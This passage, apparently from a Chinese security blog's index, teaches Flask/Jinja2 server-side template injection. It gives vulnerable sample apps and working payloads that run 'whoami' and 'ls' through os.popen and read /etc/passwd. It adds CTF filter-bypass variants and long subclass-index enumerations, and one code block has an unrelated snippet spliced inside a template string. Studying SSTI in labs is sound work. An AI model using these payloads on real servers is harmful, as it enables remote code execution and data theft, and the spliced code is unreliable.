&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 这里读取系统命令ifconfig读取ip 参考:https://www.cnblogs.com/backlion/p/9302528.html 大致学习一下XML的一些语法以及XML的注入漏洞","link":"/2021/04/10/xml%E6%B3%A8%E5%85%A5%E4%B8%8Exxe%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"title":"python SSTI注入(一)","text":"基础知识学习什么是SSTI注入ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。 from flask import Flaskfrom flask import requestfrom flask import configfrom flask import render_template_stringapp = Flask(__name__)app.config['SECRET_KEY'] = &quot;flag{SSTI_123456}&quot;@app.route('/')def hello_world(): return 'Hello World!'@app.errorhandler(404)def page_not_found(e): template = '''{%% block body %%} &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; {%% endblock %%}''' % (request.args.get('404_url')) return render_template_string(template), 404if __name__ == '__main__': app.run(host='0.0.0.0',debug=True) 此时传参的变量为404_url，如果我们访问 ?404_url={{1-1}} 页面将返回0。 在 {{}} 里，他将我们的代码进行了执行。服务器将我们的数据经过引擎解析的时候，进行了执行，模板注入与sql注入成因有点相似，都是信任了用户的输入，将不可靠的用户输入不经过滤直接进行了执行，用户插入了恶意代码同样也会执行。 直接将用户可控参数request.args.get('404_url')在模板中直接渲染并传回页面中，这种不正确的渲染方法会产生模板注入(SSTI)。 Jinja2渲染模板简介jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。 基本语法0x01 {%%} 主要用来声明变量或用在条件语句或循环语句 注意条件和循环需要多一层 {%endif%} 或 {%endfor%}用作结尾{% set c = 'Zh1z3ven' %}{% if 1==1 %}Zh1z3ven{%endif%}{% for i in [1, 2, 3] %}Zh1z3ven{%endfor%} 0x02 `{{}}` 将大括号内的表达式执行并输出结果到模板内 {{98-2}} # 96 0x03 `{##}` 注释 []，{}，” 是Python中的内置变量。通过内置变量的一些属性或函数去访问当前Python环境中的对象继承树，可以从继承树爬到根对象类。利用__subclasses__()等函数爬向每一个Object,这样便可以利用当前Python环境执行任意代码。 模板引擎首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。 模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。 通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。 后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。 前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。 让我们用例子来简析模板渲染。 &lt;html&gt;&lt;div&gt;{$what}&lt;/div&gt;&lt;/html&gt; 我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户的为 &lt;html&gt;&lt;div&gt;张三&lt;/div&gt;&lt;/html&gt; 当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。 使用函数在Python的ssti中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti，接下来讲几个知识点。 __class__ 万物皆对象，而class用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为&lt;class 'str'&gt;。 __bases__ 以元组的形式返回一个类所直接继承的类。 __base__ 以字符串返回一个类所直接继承的类。 __mro__ 返回解析方法调用的顺序。 __subclasses__() 获取类的所有子类。 __init__ 所有自带带类都包含init方法，便于利用他当跳板来调用globals。 __globals__ function.__globals__，用于获取function所处空间下可使用的module、方法以及所有变量。该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。 __builtins__ __builtins__下有eval，__import__等的函数，可以利用此来执行命令。 在看完上边这些自带方法、成员变量后，可能有点懵，接下来看看是如何利用这些方法以及成员变量达到我们想要的目的的。 在SSTI中，我们要做的无非就两个： 执行命令 获取文件内容 所以我们所做的一切实际上都是在往这两个结果靠拢。 例1: for c in []._class_._base_.subclasses_()#通过内置变量访问类——&gt;使用base输出类的父级——在通过subclasses()找到所有此父级的子级。 SSTI注入产生原因:from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route('/')def test1(): name = request.args.get('name') t = Template('''&lt;html&gt; &lt;head&gt; &lt;title&gt;hwg&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, %s !&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; '''% (name)) return t.render()if __name__ == '__main__': app.run()###############################&lt;html&gt; &lt;head&gt; &lt;title&gt;{{title}} - hwg&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;###########################from flask import Flaskfrom flask import render_templateapp = Flask(__name__)@app.route('/')@app.route('/index')def index(): user = { 'name' : 'hwg', 'info' : 'I am hwg' } return render_template(&quot;index.html&quot;, title='Home', user=user)if __name__ == '__main__': app.run() 对比上下两种代码书写两种形式:在第一种中，name参数是我们可控的，name参数后面会被直接渲染并将结果待会页面回显，所以这时就有了ssti注入:在第二种中:在flask中常用的渲染方法为render_template() 、 render_template_string() 当使用 render_template() 时，扩展名为 .html 、 .htm 、 .xml 和 .xhtml 的模板中开启自动转义。 当使用 render_template_string() 时，字符串开启 自动转义。分析一下，就是此时页面数据已经确定，并且渲染时将会被转义，即你输入的数据不会被当做指令执行，而是作为那两个花括号的一个内容进行渲染，可以看到render_template渲染的内容是index.html，而不是用户输入的数据。所以ssti产生原因便是：1.存在用户可控参数2.用户输入参数直接被渲染，即 {{}} 可被带入代码中让jinja2模块识别并解析 flask——ssti环境实战:from flask import Flaskfrom flask import render_templatefrom flask import requestfrom flask import render_template_stringapp = Flask(__name__)@app.route('/test',methods=['GET', 'POST'])def test(): template = ''' &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%sfrom flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route('/')def test1(): name = request.args.get('name') t = Template('''&lt;html&gt;&lt;head&gt;&lt;title&gt;Zh1z3ven&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello, %s !&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; '''% (name)) return t.render()if __name__ == '__main__': app.run(host='127.0.0.1', debug=True)&lt;/h3&gt; &lt;/div&gt; ''' %(request.url) return render_template_string(template) if __name__ == '__main__': app.debug = True app.run() 漏洞使用思路首先我们使用 &quot;&quot;.__class__#这里的引号是为了引出父类任何数据结构都行包括[]'' 获取类，此时会返回类是str再使用bases或者mro获取到object基类（因为object是所有类的基（父）类）。 &quot;&quot;.__class__.__bases__ 接下来获取其所有子类： &quot;&quot;.__class__.__mro__[1].__subclasses__() 我们只需要寻找可能执行命令或者可以读取文件的类就可以了，重点关注os/file这些关键字。 获取到subclasses后，初步看了一下没有能直接执行命令或者获取文件内容的，接下来使用init.globals来看看有没有os module或者其他的可以读写文件的。 {{&quot;&quot;.__class__.__mro__[1].__subclasses__()[303].__init__.__globals__}}#此时更换为花括号 因为是要执行命令了，而这个303是通过爆破得到的，爆破到具有os模块，OS模块是Python标准库中的一个用于访问操作系统功能的模块 最终payload： {{&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()}}//此时就会回显用户名 CTF中的bypass测试我们如果想知道过滤了什么的时候，可以直接在 {{}} 中测试我们输入的内容，看看网页会不会回显 过滤引号可以使用[]，’’代替第一个双引号第二个双引号的作用:获取字典内对应索引的value这里介绍一种查看方法,在python中使用type(内容)，可以查询内容的类性 type(&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__) 此时我们可以知道 ： 后面的数据类型需要的是dict这里我们可以使用request.args来绕过此处引号的过滤。 request.args是flask中一个存储着请求参数以及其值的字典，使用方法: {{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[request.args.arg1]}}&amp;arg1=os 此时即可绕过后面双引号的过滤这里还有一种方法：还有另外一种绕过引号的办法，即通过python自带函数来绕过引号，这里使用的是chr()。 {{().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}} 爆破subclasses中chr()函数在哪 {%set+chr=[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%}{{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()}} 为什么要这样构造？: {% ... %} for Statements ,可以实现for,if等语句,还支持set语法,可以给变量赋值 {%set chr=[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%} 先获取chr函数，赋值给chr，此时chr就拥有chr函数的功能了，然后接下来在后面拼接需要使用chr进行绕过的字符，如”” 过滤中括号回看最初的payload，过滤中括号对我们影响最大的是什么，前边两个中括号都是为了从数组中取值，而后续的中括号实际是不必要的，globals[“os”]可以替换为globals.os。 所以过滤了中括号实际上影响我们的只有从数组中取值，然而从数组中取值，而从数组中取值可以使用pop/getitem等数组自带方法。 不过还是建议用getitem，因为pop会破坏数组的结构。 a[0]与a.getitem(0)的效果是一样的，所以上述payload可以用此来绕过： {{&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()}} 过滤关键字如果没用过滤引号,使用反转,或者各种拼接绕过 {{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__snitliub__'[::-1]]['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}}{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__buil'+'tins__'[::-1]]['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}} 第二种绕过过滤关键字的办法即使用request对象：flask获取参数方式： request.form.get(“key”, type=str, default=None) 获取表单数据 request.args.get(“key”) 获取get请求参数 request.values.get(“key”) 获取所有参数 {&quot;&quot;.__getattribute__(request.args.a)}&amp;a=__class__ 第三种是寻找其原生函数 过滤点在python中，可用以下表示法可用于访问对象的属性 {{().__class__}}{{()[&quot;__class__&quot;]}}{{()|attr(&quot;__class__&quot;)}}{{getattr('',&quot;__class__&quot;)}} 也就是说我们可以通过[]，|attr()，getattr()来绕过点 常用语句：任意文件读取: {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %} 读取到class后所指向的可以被继承的函数小结python3的75 &lt;class '_frozen_importlib._ModuleLock'&gt; __builtins__ None75 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__ None75 &lt;class '_frozen_importlib._ModuleLock'&gt; sys None76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __builtins__ None76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__ None76 &lt;class '_frozen_importlib._DummyModuleLock'&gt; sys None77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __builtins__ None77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__ None77 &lt;class '_frozen_importlib._ModuleLockManager'&gt; sys None78 &lt;class '_frozen_importlib._installed_safely'&gt; __builtins__ None78 &lt;class '_frozen_importlib._installed_safely'&gt; __import__ None78 &lt;class '_frozen_importlib._installed_safely'&gt; sys None79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __builtins__ None79 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__ None79 &lt;class '_frozen_importlib.ModuleSpec'&gt; sys None91 &lt;class '_frozen_importlib_external.FileLoader'&gt; __builtins__ None91 &lt;class '_frozen_importlib_external.FileLoader'&gt; sys None92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __builtins__ None92 &lt;class '_frozen_importlib_external._NamespacePath'&gt; sys None93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __builtins__ None93 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; sys None95 &lt;class '_frozen_importlib_external.FileFinder'&gt; __builtins__ None95 &lt;class '_frozen_importlib_external.FileFinder'&gt; sys None103 &lt;class 'codecs.IncrementalEncoder'&gt; __builtins__ None103 &lt;class 'codecs.IncrementalEncoder'&gt; sys None103 &lt;class 'codecs.IncrementalEncoder'&gt; open None104 &lt;class 'codecs.IncrementalDecoder'&gt; __builtins__ None104 &lt;class 'codecs.IncrementalDecoder'&gt; sys None104 &lt;class 'codecs.IncrementalDecoder'&gt; open None105 &lt;class 'codecs.StreamReaderWriter'&gt; __builtins__ None105 &lt;class 'codecs.StreamReaderWriter'&gt; sys None105 &lt;class 'codecs.StreamReaderWriter'&gt; open None106 &lt;class 'codecs.StreamRecoder'&gt; __builtins__ None106 &lt;class 'codecs.StreamRecoder'&gt; sys None106 &lt;class 'codecs.StreamRecoder'&gt; open None128 &lt;class 'os._wrap_close'&gt; __builtins__ None128 &lt;class 'os._wrap_close'&gt; sys None128 &lt;class 'os._wrap_close'&gt; open None129 &lt;class '_sitebuiltins.Quitter'&gt; __builtins__ None129 &lt;class '_sitebuiltins.Quitter'&gt; sys None130 &lt;class '_sitebuiltins._Printer'&gt; __builtins__ None130 &lt;class '_sitebuiltins._Printer'&gt; sys None137 &lt;class 'types.DynamicClassAttribute'&gt; __builtins__ None138 &lt;class 'types._GeneratorWrapper'&gt; __builtins__ None139 &lt;class 'warnings.WarningMessage'&gt; __builtins__ None139 &lt;class 'warnings.WarningMessage'&gt; sys None140 &lt;class 'warnings.catch_warnings'&gt; __builtins__ None140 &lt;class 'warnings.catch_warnings'&gt; sys None167 &lt;class 'reprlib.Repr'&gt; __builtins__ None174 &lt;class 'functools.partialmethod'&gt; __builtins__ None176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __builtins__ None176 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; sys None177 &lt;class 'contextlib._BaseExitStack'&gt; __builtins__ None177 &lt;class 'contextlib._BaseExitStack'&gt; sys None----------3-----------75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; eval75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; compile75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; __import__75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; eval76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; compile76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; __import__76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; eval77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; compile77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; __import__77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec78 5 &lt;class '_frozen_importlib._installed_safely'&gt; eval78 5 &lt;class '_frozen_importlib._installed_safely'&gt; compile78 5 &lt;class '_frozen_importlib._installed_safely'&gt; __import__78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; eval79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; compile79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; __import__79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; eval91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; compile91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; __import__91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; eval92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; compile92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; __import__92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; eval93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; compile93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; __import__93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; eval95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; compile95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; __import__95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec103 7 &lt;class 'codecs.IncrementalEncoder'&gt; eval103 7 &lt;class 'codecs.IncrementalEncoder'&gt; compile103 7 &lt;class 'codecs.IncrementalEncoder'&gt; __import__103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec104 7 &lt;class 'codecs.IncrementalDecoder'&gt; eval104 7 &lt;class 'codecs.IncrementalDecoder'&gt; compile104 7 &lt;class 'codecs.IncrementalDecoder'&gt; __import__104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec105 7 &lt;class 'codecs.StreamReaderWriter'&gt; eval105 7 &lt;class 'codecs.StreamReaderWriter'&gt; compile105 7 &lt;class 'codecs.StreamReaderWriter'&gt; __import__105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open106 7 &lt;class 'codecs.StreamRecoder'&gt; exec106 7 &lt;class 'codecs.StreamRecoder'&gt; eval106 7 &lt;class 'codecs.StreamRecoder'&gt; compile106 7 &lt;class 'codecs.StreamRecoder'&gt; __import__106 7 &lt;class 'codecs.StreamRecoder'&gt; open106 56 &lt;class 'codecs.StreamRecoder'&gt; open128 1 &lt;class 'os._wrap_close'&gt; exec128 1 &lt;class 'os._wrap_close'&gt; file128 1 &lt;class 'os._wrap_close'&gt; open128 7 &lt;class 'os._wrap_close'&gt; exec128 7 &lt;class 'os._wrap_close'&gt; eval128 7 &lt;class 'os._wrap_close'&gt; compile128 7 &lt;class 'os._wrap_close'&gt; __import__128 7 &lt;class 'os._wrap_close'&gt; open128 11 &lt;class 'os._wrap_close'&gt; open129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec129 7 &lt;class '_sitebuiltins.Quitter'&gt; eval129 7 &lt;class '_sitebuiltins.Quitter'&gt; compile129 7 &lt;class '_sitebuiltins.Quitter'&gt; __import__129 7 &lt;class '_sitebuiltins.Quitter'&gt; open130 7 &lt;class '_sitebuiltins._Printer'&gt; exec130 7 &lt;class '_sitebuiltins._Printer'&gt; eval130 7 &lt;class '_sitebuiltins._Printer'&gt; compile130 7 &lt;class '_sitebuiltins._Printer'&gt; __import__130 7 &lt;class '_sitebuiltins._Printer'&gt; open137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec137 7 &lt;class 'types.DynamicClassAttribute'&gt; eval137 7 &lt;class 'types.DynamicClassAttribute'&gt; compile137 7 &lt;class 'types.DynamicClassAttribute'&gt; __import__137 7 &lt;class 'types.DynamicClassAttribute'&gt; open138 7 &lt;class 'types._GeneratorWrapper'&gt; exec138 7 &lt;class 'types._GeneratorWrapper'&gt; eval138 7 &lt;class 'types._GeneratorWrapper'&gt; compile138 7 &lt;class 'types._GeneratorWrapper'&gt; __import__138 7 &lt;class 'types._GeneratorWrapper'&gt; open139 7 &lt;class 'warnings.WarningMessage'&gt; exec139 7 &lt;class 'warnings.WarningMessage'&gt; eval139 7 &lt;class 'warnings.WarningMessage'&gt; compile139 7 &lt;class 'warnings.WarningMessage'&gt; __import__139 7 &lt;class 'warnings.WarningMessage'&gt; open140 7 &lt;class 'warnings.catch_warnings'&gt; exec140 7 &lt;class 'warnings.catch_warnings'&gt; eval140 7 &lt;class 'warnings.catch_warnings'&gt; compile140 7 &lt;class 'warnings.catch_warnings'&gt; __import__140 7 &lt;class 'warnings.catch_warnings'&gt; open167 7 &lt;class 'reprlib.Repr'&gt; exec167 7 &lt;class 'reprlib.Repr'&gt; eval167 7 &lt;class 'reprlib.Repr'&gt; compile167 7 &lt;class 'reprlib.Repr'&gt; __import__167 7 &lt;class 'reprlib.Repr'&gt; open174 7 &lt;class 'functools.partialmethod'&gt; exec174 7 &lt;class 'functools.partialmethod'&gt; eval174 7 &lt;class 'functools.partialmethod'&gt; compile174 7 &lt;class 'functools.partialmethod'&gt; __import__174 7 &lt;class 'functools.partialmethod'&gt; open176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; eval176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; compile176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; __import__176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec177 7 &lt;class 'contextlib._BaseExitStack'&gt; eval177 7 &lt;class 'contextlib._BaseExitStack'&gt; compile177 7 &lt;class 'contextlib._BaseExitStack'&gt; __import__177 7 &lt;class 'contextlib._BaseExitStack'&gt; open----------4-----------140 exec140 eval140 compile140 __import__140 open筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上----------2----------- 103 &lt;class 'codecs.IncrementalEncoder'&gt; open None 104 &lt;class 'codecs.IncrementalDecoder'&gt; open None 105 &lt;class 'codecs.StreamReaderWriter'&gt; open None 106 &lt;class 'codecs.StreamRecoder'&gt; open None 128 &lt;class 'os._wrap_close'&gt; open None ----------3----------- 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; open 75 5 &lt;class '_frozen_importlib._ModuleLock'&gt; exec 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; open 76 5 &lt;class '_frozen_importlib._DummyModuleLock'&gt; exec 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; open 77 5 &lt;class '_frozen_importlib._ModuleLockManager'&gt; exec 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; open 78 5 &lt;class '_frozen_importlib._installed_safely'&gt; exec 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; open 79 5 &lt;class '_frozen_importlib.ModuleSpec'&gt; exec 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; open 91 5 &lt;class '_frozen_importlib_external.FileLoader'&gt; exec 92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; open92 5 &lt;class '_frozen_importlib_external._NamespacePath'&gt; exec93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; open93 5 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt; exec95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; open 95 5 &lt;class '_frozen_importlib_external.FileFinder'&gt; exec 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; open 103 7 &lt;class 'codecs.IncrementalEncoder'&gt; exec 103 56 &lt;class 'codecs.IncrementalEncoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; open 104 7 &lt;class 'codecs.IncrementalDecoder'&gt; exec 104 56 &lt;class 'codecs.IncrementalDecoder'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; open 105 7 &lt;class 'codecs.StreamReaderWriter'&gt; exec 105 56 &lt;class 'codecs.StreamReaderWriter'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; open 106 7 &lt;class 'codecs.StreamRecoder'&gt; exec 106 56 &lt;class 'codecs.StreamRecoder'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; open 128 1 &lt;class 'os._wrap_close'&gt; exec 128 7 &lt;class 'os._wrap_close'&gt; open 128 7 &lt;class 'os._wrap_close'&gt; exec 128 11 &lt;class 'os._wrap_close'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; open 129 7 &lt;class '_sitebuiltins.Quitter'&gt; exec 130 7 &lt;class '_sitebuiltins._Printer'&gt; open 130 7 &lt;class '_sitebuiltins._Printer'&gt; exec 137 7 &lt;class 'types.DynamicClassAttribute'&gt; open 137 7 &lt;class 'types.DynamicClassAttribute'&gt; exec 138 7 &lt;class 'types._GeneratorWrapper'&gt; open 138 7 &lt;class 'types._GeneratorWrapper'&gt; exec 139 7 &lt;class 'warnings.WarningMessage'&gt; open 139 7 &lt;class 'warnings.WarningMessage'&gt; exec 140 7 &lt;class 'warnings.catch_warnings'&gt; open 140 7 &lt;class 'warnings.catch_warnings'&gt; exec 167 7 &lt;class 'reprlib.Repr'&gt; open 167 7 &lt;class 'reprlib.Repr'&gt; exec 174 7 &lt;class 'functools.partialmethod'&gt; open 174 7 &lt;class 'functools.partialmethod'&gt; exec 176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; open176 7 &lt;class 'contextlib._GeneratorContextManagerBase'&gt; exec177 7 &lt;class 'contextlib._BaseExitStack'&gt; open 177 7 &lt;class 'contextlib._BaseExitStack'&gt; exec ----------4----------- 140 open 140 exec python2----------1-----------(40, 'file')----------2-----------(59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__'])(59, &lt;class 'warnings.WarningMessage'&gt;, '__builtins__', None)(59, &lt;class 'warnings.WarningMessage'&gt;, 'sys', None)(59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__'])(60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__'])(60, &lt;class 'warnings.catch_warnings'&gt;, '__builtins__', None)(60, &lt;class 'warnings.catch_warnings'&gt;, 'sys', None)(60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__'])(61, &lt;class '_weakrefset._IterationGuard'&gt;, '__builtins__', None)(62, &lt;class '_weakrefset.WeakSet'&gt;, '__builtins__', None)(72, &lt;class 'site._Printer'&gt;, '__builtins__', None)(72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__'])(72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open'])(72, &lt;class 'site._Printer'&gt;, 'sys', None)(77, &lt;class 'site.Quitter'&gt;, '__builtins__', None)(77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__'])(77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open'])(77, &lt;class 'site.Quitter'&gt;, 'sys', None)(78, &lt;class 'codecs.IncrementalEncoder'&gt;, '__builtins__', None)(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'sys', None)(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None)(79, &lt;class 'codecs.IncrementalDecoder'&gt;, '__builtins__', None)(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'sys', None)(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None)----------3-----------(59, 13, &lt;class 'warnings.WarningMessage'&gt;, '__import__')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'compile')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, '__import__')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'compile')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open')(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, '__import__')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file')(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 